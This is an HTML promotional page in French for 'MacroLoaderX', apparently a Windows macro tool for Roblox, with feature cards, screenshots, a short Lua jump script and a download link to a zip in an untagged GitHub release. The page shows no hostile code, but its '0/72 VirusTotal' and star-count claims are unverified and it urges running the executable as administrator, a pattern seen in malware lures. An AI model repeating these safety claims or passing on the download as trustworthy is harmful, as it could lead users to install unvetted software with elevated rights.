<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MacroLoaderX</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/lucide-static/0.263.1/lucide.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #0a0a0a;
            color: #e4e4e4;
            line-height: 1.6;
            overflow-x: hidden;
        }

        .container {
            max-width: 900px;
            margin: 0 auto;
            padding: 60px 24px;
        }

        header {
            text-align: center;
            margin-bottom: 80px;
        }

        .logo {
            width: 120px;
            height: 120px;
            border-radius: 24px;
            margin-bottom: 24px;
            box-shadow: 0 8px 32px rgba(88, 166, 255, 0.15);
        }

        h1 {
            font-size: 48px;
            font-weight: 600;
            letter-spacing: -1px;
            margin-bottom: 12px;
            background: linear-gradient(135deg, #58a6ff, #8be9fd);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .tagline {
            font-size: 18px;
            color: #8b949e;
            margin-bottom: 32px;
        }

        .badges {
            display: flex;
            gap: 12px;
            justify-content: center;
            flex-wrap: wrap;
        }

        .badge {
            padding: 6px 14px;
            background: rgba(88, 166, 255, 0.1);
            border: 1px solid rgba(88, 166, 255, 0.2);
            border-radius: 20px;
            font-size: 13px;
            color: #58a6ff;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .badge svg {
            width: 14px;
            height: 14px;
        }

        .section {
            margin-bottom: 72px;
        }

        h2 {
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 24px;
            color: #fff;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        h2 svg {
            width: 28px;
            height: 28px;
            color: #58a6ff;
        }

        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
            gap: 16px;
            margin-top: 24px;
        }

        .card {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 12px;
            padding: 24px;
            transition: all 0.3s ease;
        }

        .card:hover {
            background: rgba(255, 255, 255, 0.05);
            border-color: rgba(88, 166, 255, 0.3);
            transform: translateY(-2px);
        }

        .card h3 {
            font-size: 16px;
            margin-bottom: 8px;
            color: #58a6ff;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .card h3 svg {
            width: 18px;
            height: 18px;
        }

        .card p {
            font-size: 14px;
            color: #8b949e;
        }

        .download-box {
            background: linear-gradient(135deg, rgba(88, 166, 255, 0.1), rgba(139, 233, 253, 0.1));
            border: 1px solid rgba(88, 166, 255, 0.2);
            border-radius: 16px;
            padding: 32px;
            text-align: center;
        }

        .version {
            display: inline-block;
            padding: 4px 12px;
            background: rgba(88, 166, 255, 0.15);
            border-radius: 12px;
            font-size: 14px;
            color: #58a6ff;
            margin-bottom: 20px;
        }

        .btn {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 14px 32px;
            background: #58a6ff;
            color: #0a0a0a;
            text-decoration: none;
            border-radius: 8px;
            font-weight: 500;
            font-size: 15px;
            transition: all 0.2s;
            margin-top: 16px;
        }

        .btn svg {
            width: 18px;
            height: 18px;
        }

        .btn:hover {
            background: #8be9fd;
            transform: scale(1.02);
        }

        .specs {
            display: flex;
            gap: 24px;
            justify-content: center;
            margin-top: 20px;
            font-size: 13px;
            color: #8b949e;
            flex-wrap: wrap;
        }

        .specs span {
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .specs svg {
            width: 14px;
            height: 14px;
        }

        .steps {
            counter-reset: step;
        }

        .step {
            position: relative;
            padding-left: 48px;
            margin-bottom: 24px;
        }

        .step::before {
            counter-increment: step;
            content: counter(step);
            position: absolute;
            left: 0;
            top: 0;
            width: 32px;
            height: 32px;
            background: rgba(88, 166, 255, 0.15);
            border: 1px solid rgba(88, 166, 255, 0.3);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #58a6ff;
            font-weight: 600;
            font-size: 14px;
        }

        .code-block {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 8px;
            padding: 20px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            color: #8be9fd;
            overflow-x: auto;
            margin-top: 16px;
        }

        .preview {
            width: 100%;
            border-radius: 12px;
            border: 1px solid rgba(255, 255, 255, 0.06);
            margin-top: 20px;
        }

        @media (max-width: 640px) {
            h1 {
                font-size: 36px;
            }

            .container {
                padding: 40px 20px;
            }

            .specs {
                flex-direction: column;
                gap: 8px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <img src="https://files.catbox.moe/qz6o4n.jpg" alt="MacroLoaderX" class="logo">
            <h1>MacroLoaderX</h1>
            <p class="tagline">L'outil macro le plus complet et facile à utiliser pour Roblox en 2026</p>
            <div class="badges">
                <span class="badge">
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11.049 2.927c.3-.921 1.603-.921 1.902 0l1.519 4.674a1 1 0 00.95.69h4.915c.969 0 1.371 1.24.588 1.81l-3.976 2.888a1 1 0 00-.363 1.118l1.518 4.674c.3.922-.755 1.688-1.538 1.118l-3.976-2.888a1 1 0 00-1.176 0l-3.976 2.888c-.783.57-1.838-.197-1.538-1.118l1.518-4.674a1 1 0 00-.363-1.118l-3.976-2.888c-.784-.57-.38-1.81.588-1.81h4.914a1 1 0 00.951-.69l1.519-4.674z" /></svg>
                    2.4k stars
                </span>
                <span class="badge">
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8.684 13.342C8.886 12.938 9 12.482 9 12c0-.482-.114-.938-.316-1.342m0 2.684a3 3 0 110-2.684m0 2.684l6.632 3.316m-6.632-6l6.632-3.316m0 0a3 3 0 105.367-2.684 3 3 0 00-5.367 2.684zm0 9.316a3 3 0 105.368 2.684 3 3 0 00-5.368-2.684z" /></svg>
                    580 forks
                </span>
                <span class="badge">
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z" /></svg>
                    Discord actif
                </span>
            </div>
        </header>

        <section class="section">
            <h2>
                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4M7.835 4.697a3.42 3.42 0 001.946-.806 3.42 3.42 0 014.438 0 3.42 3.42 0 001.946.806 3.42 3.42 0 013.138 3.138 3.42 3.42 0 00.806 1.946 3.42 3.42 0 010 4.438 3.42 3.42 0 00-.806 1.946 3.42 3.42 0 01-3.138 3.138 3.42 3.42 0 00-1.946.806 3.42 3.42 0 01-4.438 0 3.42 3.42 0 00-1.946-.806 3.42 3.42 0 01-3.138-3.138 3.42 3.42 0 00-.806-1.946 3.42 3.42 0 010-4.438 3.42 3.42 0 00.806-1.946 3.42 3.42 0 013.138-3.138z" /></svg>
                À quoi ça sert ?
            </h2>
            <p>MacroLoaderX automatise vos actions répétitives dans Roblox grâce à des macros Lua simples. Répétez des séquences, automatisez des clics ou créez des routines personnalisées dans vos jeux préférés.</p>
        </section>

        <section class="section">
            <h2>
                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 3v4M3 5h4M6 17v4m-2-2h4m5-16l2.286 6.857L21 12l-5.714 2.143L13 21l-2.286-6.857L5 12l5.714-2.143L13 3z" /></svg>
                Fonctionnalités
            </h2>
            <div class="grid">
                <div class="card">
                    <h3>
                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4" /></svg>
                        Exécution Lua
                    </h3>
                    <p>Charge et lance vos scripts personnalisés en toute simplicité</p>
                </div>
                <div class="card">
                    <h3>
                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" /></svg>
                        Interface moderne
                    </h3>
                    <p>Menu clair et intuitif pour gérer toutes vos macros</p>
                </div>
                <div class="card">
                    <h3>
                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z" /></svg>
                        Éditeur intégré
                    </h3>
                    <p>Écrivez et testez vos macros directement dans l'application</p>
                </div>
                <div class="card">
                    <h3>
                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10" /></svg>
                        +300 macros
                    </h3>
                    <p>Bibliothèque communautaire prête à l'emploi</p>
                </div>
                <div class="card">
                    <h3>
                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 5a1 1 0 011-1h4a1 1 0 011 1v7a1 1 0 01-1 1H5a1 1 0 01-1-1V5zM14 5a1 1 0 011-1h4a1 1 0 011 1v7a1 1 0 01-1 1h-4a1 1 0 01-1-1V5zM4 16a1 1 0 011-1h4a1 1 0 011 1v3a1 1 0 01-1 1H5a1 1 0 01-1-1v-3zM14 16a1 1 0 011-1h4a1 1 0 011 1v3a1 1 0 01-1 1h-4a1 1 0 01-1-1v-3z" /></svg>
                        Multi-fenêtres
                    </h3>
                    <p>Fonctionne même en plein écran</p>
                </div>
                <div class="card">
                    <h3>
                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" /></svg>
                        Mises à jour
                    </h3>
                    <p>Nouvelles versions régulières avec améliorations</p>
                </div>
            </div>
        </section>

        <section class="section">
            <h2>
                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z" /></svg>
                Aperçus
            </h2>
            <img src="https://files.catbox.moe/n4ezs7.jpg" alt="Interface principale" class="preview">
            <img src="https://files.catbox.moe/in961k.jpg" alt="Macro en action" class="preview">
        </section>

        <section class="section">
            <h2>
                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M9 19l3 3m0 0l3-3m-3 3V10" /></svg>
                Téléchargement
            </h2>
            <div class="download-box">
                <span class="version">v2.4.0 — 01/01/2026</span>
                <a href="https://github.com/n0lex9999/MacroLoaderX/releases/download/untagged-e76d7861168038356685/MacroLoaderX.zip" class="btn">
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" /></svg>
                    Télécharger MacroLoaderX
                </a>
                <div class="specs">
                    <span>
                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20 7l-8-4-8 4m16 0l-8 4m8-4v10l-8 4m0-10L4 7m8 4v10M4 7v10l8 4" /></svg>
                        1.38 MB
                    </span>
                    <span>
                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" /></svg>
                        Windows 10/11
                    </span>
                    <span>
                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
                        0/72 VirusTotal
                    </span>
                </div>
            </div>
        </section>

        <section class="section">
            <h2>
                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z" /></svg>
                Comment l'utiliser
            </h2>
            <div class="steps">
                <div class="step">
                    <strong>Téléchargez</strong> le fichier ci-dessus
                </div>
                <div class="step">
                    <strong>Lancez</strong> MacroLoaderX.exe en administrateur (recommandé)
                </div>
                <div class="step">
                    <strong>Ouvrez</strong> Roblox et rejoignez votre jeu
                </div>
                <div class="step">
                    <strong>Chargez</strong> une macro .lua depuis l'interface
                </div>
                <div class="step">
                    <strong>Démarrez</strong> et profitez de l'automatisation
                </div>
            </div>

            <div class="code-block">while true do
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
    wait(2)
end</div>
        </section>
    </div>
</body>
</html>
